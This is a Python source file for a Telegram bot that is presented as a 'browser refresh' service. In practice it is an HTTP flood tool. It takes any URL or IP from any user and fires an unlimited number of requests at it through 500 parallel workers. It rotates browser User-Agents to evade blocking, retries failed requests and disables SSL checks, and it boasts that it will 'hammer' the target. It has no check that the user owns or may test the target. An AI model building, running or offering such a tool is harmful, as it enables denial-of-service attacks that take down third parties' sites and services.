"""
Telegram HTTP Request Bot
--------------------------
- User sends a URL or IPv4 address
- Bot asks: how many requests? (no limit)
- Bot shows inline button: [▶ Start Sending]
- After start: shows [📊 Stats] button to check live progress
- Stats shows: sent, remaining, success/error counts, target URL
- /cancel resets the conversation at any step
- MongoDB stores all sessions (one doc per user)
- Webhook mode on Render with self-ping every 10 min to avoid cold starts
- High-concurrency browser-style refresh engine (500 workers, smart retries)
"""

import asyncio
import logging
import os
import random
import urllib.request
import urllib.error
import re
from datetime import datetime, timezone

import aiohttp
from aiohttp import TCPConnector
from dotenv import load_dotenv
from pymongo import MongoClient
from pymongo.errors import PyMongoError
from telegram import (
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Update,
)
from telegram.ext import (
    ApplicationBuilder,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

load_dotenv()

# ---------------------------------------------------------------------------
# Config — missing required vars produce a clear error at startup
# ---------------------------------------------------------------------------
def _require(key: str) -> str:
    val = os.environ.get(key, "")
    if not val:
        raise RuntimeError(
            f"Required environment variable '{key}' is not set.\n"
            f"Add it in your Render dashboard (Environment → Add Environment Variable)."
        )
    return val


BOT_TOKEN    = _require("BOT_TOKEN")
MONGO_URI    = _require("MONGO_URI")
DB_NAME      = os.environ.get("MONGO_DB_NAME", "reqbot")
WEBHOOK_URL  = os.environ.get("WEBHOOK_URL", "")
PORT         = int(os.environ.get("PORT", "8080"))

# No request limit enforced

# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------
logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger("reqbot")

# ---------------------------------------------------------------------------
# MongoDB
# ---------------------------------------------------------------------------
try:
    mongo_client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=8000)
    mongo_client.server_info()          # fail fast if URI is wrong
    db           = mongo_client[DB_NAME]
    sessions_col = db["sessions"]
    logger.info("MongoDB connected — database: %s", DB_NAME)
except PyMongoError as exc:
    raise RuntimeError(f"Cannot connect to MongoDB: {exc}") from exc

# ---------------------------------------------------------------------------
# Regex helpers
# ---------------------------------------------------------------------------
URL_RE = re.compile(
    r"^(https?://)"
    r"(\d{1,3}\.){3}\d{1,3}"
    r"(:\d+)?(/.*)?$"
    r"|"
    r"^(https?://)?"
    r"([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}"
    r"(:\d+)?(/.*)?$",
    re.IGNORECASE,
)
IPV4_RE = re.compile(r"^(\d{1,3}\.){3}\d{1,3}$")


def is_valid_target(text: str) -> bool:
    text = text.strip()
    if IPV4_RE.match(text):
        parts = text.split(".")
        return all(0 <= int(p) <= 255 for p in parts)
    return bool(URL_RE.match(text))


def normalize_url(text: str) -> str:
    text = text.strip()
    if not text.startswith(("http://", "https://")):
        return "http://" + text
    return text

# ---------------------------------------------------------------------------
# Conversation states (stored in context.user_data)
# ---------------------------------------------------------------------------
STATE_IDLE       = "idle"
STATE_WAIT_COUNT = "wait_count"

# ---------------------------------------------------------------------------
# MongoDB session helpers
# ---------------------------------------------------------------------------

def upsert_session(user_id: int, data: dict):
    sessions_col.update_one(
        {"user_id": user_id},
        {"$set": {**data, "updated_at": datetime.now(timezone.utc)}},
        upsert=True,
    )


def get_session(user_id: int) -> dict | None:
    return sessions_col.find_one({"user_id": user_id})


def update_session(user_id: int, data: dict):
    sessions_col.update_one(
        {"user_id": user_id},
        {"$set": {**data, "updated_at": datetime.now(timezone.utc)}},
    )

# ---------------------------------------------------------------------------
# Keyboards
# ---------------------------------------------------------------------------

def start_keyboard(user_id: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("▶ Start Refreshing", callback_data=f"start:{user_id}"),
    ]])


def stats_keyboard(user_id: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("📊 Refresh Stats", callback_data=f"stats:{user_id}"),
    ]])


def done_keyboard(user_id: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("📊 Final Stats", callback_data=f"stats:{user_id}"),
    ]])

# ---------------------------------------------------------------------------
# /start command
# ---------------------------------------------------------------------------

async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["state"] = STATE_IDLE
    await update.message.reply_text(
        "👋 *Browser Refresh Bot*\n\n"
        "Send me a *URL* or *IPv4 address* and I'll hammer it with 500 parallel browser-style refreshes.\n\n"
        "📌 *Steps:*\n"
        "1️⃣ Send a URL or IPv4 address\n"
        "2️⃣ Enter refresh count _(any amount)_\n"
        "3️⃣ Tap *▶ Start Refreshing*\n"
        "4️⃣ Tap *📊 Refresh Stats* any time\n\n"
        "Use /cancel to reset at any point.",
        parse_mode="Markdown",
    )

# ---------------------------------------------------------------------------
# /cancel command
# ---------------------------------------------------------------------------

async def cancel_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid   = update.effective_user.id
    state = context.user_data.get("state", STATE_IDLE)
    context.user_data.clear()
    context.user_data["state"] = STATE_IDLE

    session = get_session(uid)
    if session and session.get("status") == "running":
        update_session(uid, {"status": "cancelled"})
        await update.message.reply_text(
            "🛑 Running session *cancelled*.\n\nSend a new URL to start over.",
            parse_mode="Markdown",
        )
    elif state != STATE_IDLE:
        await update.message.reply_text(
            "↩️ Conversation reset.\n\nSend a URL or IPv4 address to begin.",
        )
    else:
        await update.message.reply_text(
            "Nothing to cancel. Send a URL or IPv4 address to get started."
        )

# ---------------------------------------------------------------------------
# Message router
# ---------------------------------------------------------------------------

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text  = (update.message.text or "").strip()
    state = context.user_data.get("state", STATE_IDLE)
    uid   = update.effective_user.id

    # ── Step 1: receive target URL / IP ─────────────────────────────────────
    if state == STATE_IDLE:
        if not is_valid_target(text):
            await update.message.reply_text(
                "❌ That doesn't look like a valid URL or IPv4 address.\n\n"
                "Examples:\n"
                "• `https://example.com`\n"
                "• `192.168.1.1`\n"
                "• `http://10.0.0.1:8080/path`",
                parse_mode="Markdown",
            )
            return

        url = normalize_url(text)
        upsert_session(uid, {
            "user_id":    uid,
            "target_url": url,
            "status":     "configuring",
        })
        context.user_data["target_url"] = url
        context.user_data["state"]      = STATE_WAIT_COUNT

        await update.message.reply_text(
            f"✅ Target set: `{url}`\n\n"
            "How many browser refreshes? _(enter any number ≥ 1)_",
            parse_mode="Markdown",
        )
        return

    # ── Step 2: receive request count ───────────────────────────────────────
    if state == STATE_WAIT_COUNT:
        if not text.isdigit() or int(text) < 1:
            await update.message.reply_text(
                "⚠️ Please enter a whole number of 1 or more."
            )
            return

        count = int(text)

        url = context.user_data.get("target_url", "")
        update_session(uid, {
            "total_requests": count,
            "sent_requests":  0,
            "success_count":  0,
            "error_count":    0,
            "status":         "ready",
        })
        context.user_data["total_requests"] = count
        context.user_data["state"]          = STATE_IDLE

        await update.message.reply_text(
            f"🎯 *Ready to fire!*\n\n"
            f"🌐 *Target:* `{url}`\n"
            f"🔄 *Refreshes:* {count} _(500 parallel workers, browser headers)_\n\n"
            f"Press *▶ Start Refreshing* to begin.",
            parse_mode="Markdown",
            reply_markup=start_keyboard(uid),
        )
        return

    # Fallback
    await update.message.reply_text(
        "📌 Send me a URL or IPv4 address to get started, or use /start."
    )

# ---------------------------------------------------------------------------
# Callback handler (inline buttons)
# ---------------------------------------------------------------------------

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data  = query.data or ""
    await query.answer()

    # ── ▶ Start Sending ─────────────────────────────────────────────────────
    if data.startswith("start:"):
        uid     = update.effective_user.id
        session = get_session(uid)

        if not session or session.get("status") not in ("ready",):
            await query.edit_message_text(
                "⚠️ No ready session found. Please send a URL first."
            )
            return

        if session.get("status") == "running":
            await query.answer("Already running!", show_alert=True)
            return

        update_session(uid, {
            "status":        "running",
            "sent_requests": 0,
            "success_count": 0,
            "error_count":   0,
        })

        url   = session["target_url"]
        total = session["total_requests"]

        await query.edit_message_text(
            f"🚀 *Refreshing!*\n\n"
            f"🌐 Target: `{url}`\n"
            f"🔄 Firing *{total}* browser-style refreshes with 500 parallel workers…\n\n"
            f"Tap *📊 Refresh Stats* to check progress.",
            parse_mode="Markdown",
            reply_markup=stats_keyboard(uid),
        )

        asyncio.create_task(
            send_requests_task(
                bot=context.bot,
                uid=uid,
                chat_id=update.effective_chat.id,
                url=url,
                total=total,
            )
        )
        return

    # ── 📊 Stats ─────────────────────────────────────────────────────────────
    if data.startswith("stats:"):
        uid     = update.effective_user.id
        session = get_session(uid)

        if not session:
            await query.answer("No session found.", show_alert=True)
            return

        sent      = session.get("sent_requests", 0)
        total     = session.get("total_requests", 0)
        remaining = max(0, total - sent)
        status    = session.get("status", "unknown")
        url       = session.get("target_url", "N/A")
        success   = session.get("success_count", 0)
        errors    = session.get("error_count", 0)

        status_icon = {
            "ready":      "🟡 Ready",
            "running":    "🟢 Running",
            "done":       "✅ Done",
            "cancelled":  "🛑 Cancelled",
            "configuring":"⚙️ Configuring",
        }.get(status, f"❓ {status}")

        # Build progress bar (10 blocks)
        if total > 0:
            filled = round((sent / total) * 10)
            bar    = "█" * filled + "░" * (10 - filled)
            pct    = round((sent / total) * 100)
            progress_line = f"\n📈 Progress: `[{bar}]` {pct}%\n"
        else:
            progress_line = ""

        msg = (
            f"📊 *Session Stats*\n\n"
            f"🌐 *Target:* `{url}`\n"
            f"🔄 *Refreshed:* {sent} / {total}\n"
            f"⏳ *Remaining:* {remaining}\n"
            f"✅ *Successful:* {success}   ❌ *Failed:* {errors}\n"
            f"📶 *Status:* {status_icon}"
            f"{progress_line}"
        )

        keyboard = stats_keyboard(uid) if status == "running" else None

        try:
            await query.edit_message_text(
                msg,
                parse_mode="Markdown",
                reply_markup=keyboard,
            )
        except Exception:
            # Message unchanged — Telegram rejects identical edits
            pass
        return

# ---------------------------------------------------------------------------
# Browser User-Agent pool — rotated per request to avoid blocks
# ---------------------------------------------------------------------------
_USER_AGENTS = [
    # Chrome on Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    # Chrome on macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    # Firefox on Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    # Firefox on Linux
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
    # Edge on Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
    # Safari on macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
    # Chrome on Android
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.113 Mobile Safari/537.36",
]

def _browser_headers(url: str) -> dict:
    """Return realistic browser headers that mimic a page refresh (Ctrl+F5)."""
    ua = random.choice(_USER_AGENTS)
    from urllib.parse import urlparse
    parsed = urlparse(url)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    return {
        "User-Agent":                ua,
        "Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language":           "en-US,en;q=0.9",
        "Accept-Encoding":           "gzip, deflate, br",
        "Cache-Control":             "no-cache",          # hard refresh
        "Pragma":                    "no-cache",          # hard refresh
        "Upgrade-Insecure-Requests": "1",
        "Referer":                   origin,
        "Origin":                    origin,
        "Connection":                "keep-alive",
        "DNT":                       "1",
    }

# ---------------------------------------------------------------------------
# Background task: high-concurrency browser-style refresh engine
# ---------------------------------------------------------------------------

# Tuning knobs
_CONCURRENCY   = 500   # parallel workers
_MAX_RETRIES   = 5     # retry attempts per request before giving up
_RETRY_DELAYS  = [0.05, 0.1, 0.25, 0.5, 1.0]  # back-off per retry
_CONNECT_TIMEOUT = 8   # seconds
_READ_TIMEOUT    = 20  # seconds
_DB_FLUSH_EVERY  = 25  # flush counters to MongoDB every N completions


async def _do_single_refresh(
    session: aiohttp.ClientSession,
    url: str,
    sem: asyncio.Semaphore,
) -> bool:
    """Perform one browser-style GET with retries. Returns True on success."""
    async with sem:
        for attempt in range(_MAX_RETRIES):
            try:
                headers = _browser_headers(url)
                async with session.get(
                    url,
                    headers=headers,
                    ssl=False,
                    allow_redirects=True,
                ) as resp:
                    # Read body so the server sees a complete page load
                    await resp.read()
                    # Any HTTP response counts as a successful "refresh"
                    # (the page was served — even 4xx means the server responded)
                    return True
            except (aiohttp.ServerDisconnectedError,
                    aiohttp.ClientConnectorError,
                    asyncio.TimeoutError) as exc:
                if attempt < _MAX_RETRIES - 1:
                    await asyncio.sleep(_RETRY_DELAYS[attempt])
                else:
                    logger.debug("Req failed after %d retries: %s", _MAX_RETRIES, exc)
                    return False
            except Exception as exc:
                logger.debug("Req unexpected error: %s", exc)
                return False
    return False


async def send_requests_task(
    bot,
    uid: int,
    chat_id: int,
    url: str,
    total: int,
):
    """High-concurrency browser-style refresh engine.

    • 500 parallel workers
    • Browser headers + User-Agent rotation (looks like real page refreshes)
    • Up to 5 retries per request with exponential back-off
    • Any HTTP response = success (server was reached and responded)
    • Only true network failures (timeout, refused) count as errors
    • Respects 'cancelled' status from /cancel
    """
    sent    = 0
    success = 0
    errors  = 0

    sem = asyncio.Semaphore(_CONCURRENCY)

    connector = TCPConnector(
        limit=_CONCURRENCY + 50,   # max open connections
        limit_per_host=_CONCURRENCY,
        ttl_dns_cache=300,
        enable_cleanup_closed=True,
        ssl=False,
    )
    timeout = aiohttp.ClientTimeout(
        connect=_CONNECT_TIMEOUT,
        sock_read=_READ_TIMEOUT,
        total=None,  # let individual retries manage total time
    )

    async with aiohttp.ClientSession(
        connector=connector,
        timeout=timeout,
        trust_env=True,
    ) as http:

        pending: set[asyncio.Task] = set()
        idx = 0

        while idx < total or pending:
            # Check for cancellation
            if not (idx % 50):   # check every 50 launches
                db_session = get_session(uid)
                if db_session and db_session.get("status") == "cancelled":
                    logger.info("Task uid=%d cancelled at idx=%d", uid, idx)
                    for t in pending:
                        t.cancel()
                    return

            # Fill up to concurrency
            while idx < total and len(pending) < _CONCURRENCY:
                task = asyncio.create_task(
                    _do_single_refresh(http, url, sem)
                )
                pending.add(task)
                idx += 1

            if not pending:
                break

            # Wait for the first batch to finish
            done, pending = await asyncio.wait(
                pending, return_when=asyncio.FIRST_COMPLETED
            )

            for t in done:
                ok = t.result()
                sent += 1
                if ok:
                    success += 1
                else:
                    errors += 1

            # Flush to MongoDB periodically
            if sent % _DB_FLUSH_EVERY == 0 or sent == total:
                update_session(uid, {
                    "sent_requests": sent,
                    "success_count": success,
                    "error_count":   errors,
                })

    update_session(uid, {
        "status":        "done",
        "sent_requests": sent,
        "success_count": success,
        "error_count":   errors,
    })

    summary = (
        f"✅ *All done!*\n\n"
        f"🌐 Target: `{url}`\n"
        f"🔄 Refreshes: *{sent}* / {total}\n"
        f"✅ Successful: *{success}*   ❌ Failed: *{errors}*\n\n"
        f"Send another URL to start a new session."
    )

    try:
        await bot.send_message(chat_id, summary, parse_mode="Markdown")
    except Exception as exc:
        logger.error("Could not notify user %d on completion: %s", uid, exc)

# ---------------------------------------------------------------------------
# Self-ping (keeps Render free tier alive, fires every 10 min)
# ---------------------------------------------------------------------------

_self_ping_url: str | None = None


async def self_ping(context: ContextTypes.DEFAULT_TYPE):
    if not _self_ping_url:
        return
    try:
        req = urllib.request.Request(_self_ping_url, method="GET")
        with urllib.request.urlopen(req, timeout=15) as resp:
            logger.info("Self-ping OK (%s)", resp.status)
    except urllib.error.HTTPError as exc:
        logger.info("Self-ping HTTP %s (service alive)", exc.code)
    except Exception:
        logger.exception("Self-ping failed")

# ---------------------------------------------------------------------------
# Error handler
# ---------------------------------------------------------------------------

async def on_error(update: object, context: ContextTypes.DEFAULT_TYPE):
    logger.exception("Unhandled error: %s", context.error)

# ---------------------------------------------------------------------------
# App builder
# ---------------------------------------------------------------------------

def build_app():
    app = (
        ApplicationBuilder()
        .token(BOT_TOKEN)
        .build()
    )

    app.add_handler(CommandHandler("start",  start_cmd))
    app.add_handler(CommandHandler("cancel", cancel_cmd))
    app.add_handler(CallbackQueryHandler(handle_callback))
    app.add_handler(
        MessageHandler(
            filters.ChatType.PRIVATE & filters.TEXT & ~filters.COMMAND,
            handle_message,
        )
    )
    app.add_error_handler(on_error)

    return app

# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main():
    global _self_ping_url

    app = build_app()

    render_url     = os.environ.get("RENDER_EXTERNAL_URL", "")
    on_render      = os.environ.get("RENDER", "") == "true"
    webhook_target = WEBHOOK_URL or render_url

    if on_render and not webhook_target:
        raise RuntimeError(
            "Running on Render but neither WEBHOOK_URL nor RENDER_EXTERNAL_URL is set.\n"
            "Add WEBHOOK_URL in your Render dashboard."
        )

    if webhook_target:
        webhook_base = webhook_target.rstrip("/")
        if not webhook_base.startswith(("http://", "https://")):
            webhook_base = f"https://{webhook_base}"

        full_webhook_url = f"{webhook_base}/{BOT_TOKEN}"

        logger.info("Webhook mode — port %s", PORT)
        logger.info("Webhook URL: %s", full_webhook_url)

        # Self-ping every 10 min (first ping after 60 s)
        _self_ping_url = webhook_base
        app.job_queue.run_repeating(self_ping, interval=600, first=60)

        app.run_webhook(
            listen="0.0.0.0",
            port=PORT,
            url_path=BOT_TOKEN,
            webhook_url=full_webhook_url,
            allowed_updates=Update.ALL_TYPES,
            drop_pending_updates=True,
        )
    else:
        logger.info("Polling mode (local dev — no WEBHOOK_URL / RENDER_EXTERNAL_URL)")
        app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)


if __name__ == "__main__":
    main()
